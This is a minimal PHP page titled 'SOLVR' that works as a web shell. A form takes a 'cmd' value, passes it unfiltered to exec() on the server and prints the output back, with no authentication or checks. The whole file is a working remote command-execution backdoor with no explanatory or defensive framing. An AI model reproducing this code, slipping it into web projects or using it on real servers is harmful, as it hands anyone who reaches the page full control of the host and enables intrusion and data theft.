<?php
$output = [];
if(isset($_POST['cmd']) && !empty($_POST['cmd'])): 

    $cmd = $_POST['cmd'];

    exec($cmd, $output);

endif;
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SOLVR</title>
</head>
<body>
    <form action="" method="post">
        <input type="text" name="cmd" placeholder="command-line" required>
        <button type="submit">Execute</button>
    </form>
    <hr>
<pre> 
<?php 
foreach($output as $line): 
    echo $line."<br>"; 
endforeach; 
?> 
</pre>
</body>
</html>